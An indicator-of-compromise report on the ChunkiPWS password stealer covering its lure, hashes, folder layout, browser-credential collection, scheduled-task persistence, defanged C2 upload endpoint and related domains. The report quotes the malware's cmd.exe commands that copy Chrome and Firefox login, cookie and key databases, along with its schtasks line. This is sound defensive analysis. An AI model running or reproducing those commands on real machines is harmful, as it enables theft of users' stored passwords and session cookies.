# Observed malicious IOCs for Chunki Password Stealer aka (ChunkiPWS)

### Date of first occurrence

27-03-2022

### Description:

A victim watches a video and is lured into downloading a malicious installation package from mediafire.com.  When ChunkiPWS is executed, the password stealer collects credentials and gathers operating system and software information.  This information is then uploaded to a remote server using a POST request.  Persistence is set as a scheduled task which periodically runs AutoIT scripts.  ChunkiPWS was named after its enormous size of its installation package.

### Sample Analysis
https://app.any.run/tasks/a5d03b82-b444-4849-b9ac-6a68a4a507b1/

### Malicious Installation Package

Sample download link to ChunkiPWS

```
https[:]//www.mediafire[.]com/file/xqj110ce9lm2vyu/Open__The__File__Setup.zip/fileapplication/zipapplication/
```

```
Installation Package:

File Name: Open__The__File__Setup.zip
Sha256Hash: a7ce9cd6cd40ff21ede8736327a95eb8f0ad193a943dd091c9d6ec91cc02bef2 

Decompressed Archive:

File Name: Install__Latest__Download.zip
Sha256Hash: ae68059ea44da06c59ee4c59dd616614aa9f59fa5b461ef0acbb94967e5f1b56

File Name: 'Password Is  =   1122.txt'

Decompressed Executable:

File Name: File__Setup.exe
File Size: 671M
Sha256Hash: 88b1fb836125454ac4c3553b3414a5a67096a105f5fd573a2822b84ee553bca5
```

### Obstacles

The file size of the ChunkiPWS is around 670-700 mb, making analysis quite difficult to perform.  Most sandbox platform can upload a maximum of 50-100mb in size.  Also, downloading the samples through EDRs was near impossible at times.

### Observed activity of `File__Setup.exe`

When executed, a single folder is created in the victim's temp directory.  The name of the folder is four random numbers.  For Example:

```
Directory names:

C:\users\<profile>\appdata\local\temp\2300
C:\users\<profile>\appdata\local\temp\4492
C:\users\<profile>\appdata\local\temp\5753
C:\users\<profile>\appdata\local\temp\5777
C:\users\<profile>\appdata\local\temp\7090
C:\users\<profile>\appdata\local\temp\8727
```

When a folder is created, a folder structure is created which is intended to collect and organize the collected information.

```
Directory Name 
---- 

_Brave 
_Chrome 
_Edge 
_Files 
_Firefox 
_Opera 
_Wallet 
_Information.txt 
_Screen_Desktop.jpeg
```

### Data Collection:

The following commands were executed to collect credentials, OS and Software information.

```
_Chrome 

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Local\google\chrome\User Data\Default\Web Data" "C:\Users\<profile>\AppData\Local\Temp\2300\_Chrome\default_webdata.db"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Local\google\chrome\User Data\Default\Login Data" "C:\Users\<profile>\AppData\Local\Temp\2300\_Chrome\default_logins.db"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Local\google\chrome\User Data\Default\Cookies" "C:\Users\<profile>\AppData\Local\Temp\2300\_Chrome\default_cookies.db"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Local\google\chrome\User Data\Default\Network\Cookies" "C:\Users\<profile>\AppData\Local\Temp\2300\_Chrome\default_cookies.db"
```

```
_Firefox

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Roaming\Mozilla\Firefox\Profiles/qldyz51w.default\formhistory.sqlite" "C:\Users\<profile>\AppData\Local\Temp\2300\_Firefox\formhistory.sqlite"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Roaming\Mozilla\Firefox\Profiles/qldyz51w.default\cookies.sqlite" "C:\Users\<profile>\AppData\Local\Temp\2300\_Firefox\cookies.sqlite"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Roaming\Mozilla\Firefox\Profiles/qldyz51w.default\signons.sqlite" "C:\Users\<profile>\AppData\Local\Temp\2300\_Firefox\signons.sqlite"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Roaming\Mozilla\Firefox\Profiles/qldyz51w.default\logins.json" "C:\Users\<profile>\AppData\Local\Temp\2300\_Firefox\logins.json"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Roaming\Mozilla\Firefox\Profiles/qldyz51w.default\key3.db" "C:\Users\<profile>\AppData\Local\Temp\2300\_Firefox\key3.db"

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\AppData\Roaming\Mozilla\Firefox\Profiles/qldyz51w.default\key4.db" "C:\Users\<profile>\AppData\Local\Temp\2300\_Firefox\key4.db"
```

```
_Files

C:\Windows\system32\cmd.exe /c copy /Y "C:\Users\<profile>\Desktop\*.txt" "C:\Users\<profile>\AppData\Local\Temp\2300
```

```
_Information.txt

[OS, Local Date and Time, Username, CPU, RAM, GPU, Display Resolution]
```

```
_Screen_Desktop.jpeg

Screenshot of the desktop of the time of infection
```

### Persistence

A scheduled task is created to run AutoITv3 scripts. This portion of the analysis did not complete successfully, so I will need to do more research. 

```
schtasks /create /tn \Service\Diagnostic /tr """"C:\Users\<profile>\AppData\Roaming\ServiceGet\Tasuges.exe""" """C:\Users\<profile>\AppData\Roaming\ServiceGet\Tasuges.dat"""" /st 00:01 /du 
```

https://www.virustotal.com/gui/file/237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d/detection

### Exfiltration

Data is then zipped and uploaded to a C2 server via A POST request.

```
http[:]//sables23[.]top/index.php

data: Content-Disposition: form-data; name="file";filename="19696.zip"

19696.zip contains the exfiltrated data
```

### Related Domains Observed

```
5a5vmh.top
rnkj09.top
85kvie.top
vcev5c.top
hwh75t.top
rmgs2r.top
kzwor6.top
0m9rxw.top
63rx85.top
nn2ms2.top
n41n1a.top
pap44w.top
o08a6d.top
qor499.top
hezwde.top
bw9e2z.top
networksinform.top
utebcd.top
wwa4tu.top
uboys5.top
cno42s.top
bcjl1h.top
wonderworlddd.top
gotrustuni.top
e6in0v.top
bd7tlu.top
thyx30.top
o8hpwj.top
1bqroa.top
ibngww.top
dgjpgy.top
odmtu3.top
c6tjvl.top
va3ibn.top
sk8r54.top
zmn16h.top
kzhzuc.top
vbfyit.top
nngolodasz.top
rxmbsm.top
2gbbja.top
wrd4fo.top
httsps.top
305iot.top
3t3hyf.top
n80yab.top
vgxcci.top
5m2n7x.top
dmvute.top
ean5e7.top
kml2o2.top
859rkn.top
fapoergol.top
hookup4444.top
tsrwj3.top
laugk2.top
falloutgood.top
p3tt2t.top
4bx196.top
yl1wg6.top
kt70uk.top
gs2ka7.top
0cgaez.top
bvbg1l.top
p7k7t4.top
hometowergop.top
ac7zvz.top
lxvmhm.top
5p76tw.top
308an1.top
x9ap4h.top
glg1i0.top
ucrw57.top
r21wmw.top
06j7o0.top
```
